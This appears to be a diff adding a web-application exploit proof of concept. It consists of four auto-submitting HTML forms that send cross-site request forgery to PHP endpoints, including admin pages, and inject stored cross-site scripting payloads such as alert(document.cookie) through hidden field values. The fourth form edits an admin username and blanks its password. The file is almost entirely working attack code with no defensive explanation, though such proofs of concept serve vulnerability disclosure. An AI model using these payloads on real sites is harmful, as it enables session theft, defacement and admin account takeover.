@@ -1,0 +1,41 @@
+1.
+&lt;form action=&quot;http://www.example.com/add_story.php&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;story_url&quot; value=&#039;http://www.example.com/&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;Submit&quot; value=&quot;Continue&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+2.
+&lt;form action=&quot;http://www.example.com/editprofile.php&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&#039;email@example.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;commentst&quot; value=&quot;-4&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;Submit&quot; value=&quot;Save Changes&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+3.
+&lt;form action=&quot;http://www.example.com/adm/content_add.php&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;999&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;title&quot; value=&#039;page&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;contentvalue=&quot;content&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;Submit&quot; value=&quot;Submit&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+4.
+&lt;form action=&quot;http://www.example.com/adm/admin_edit.php&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;id[1]&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;username[1]&quot; value=&#039;admin&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;password[1]&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;Submit&quot; value=&quot;Submit&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
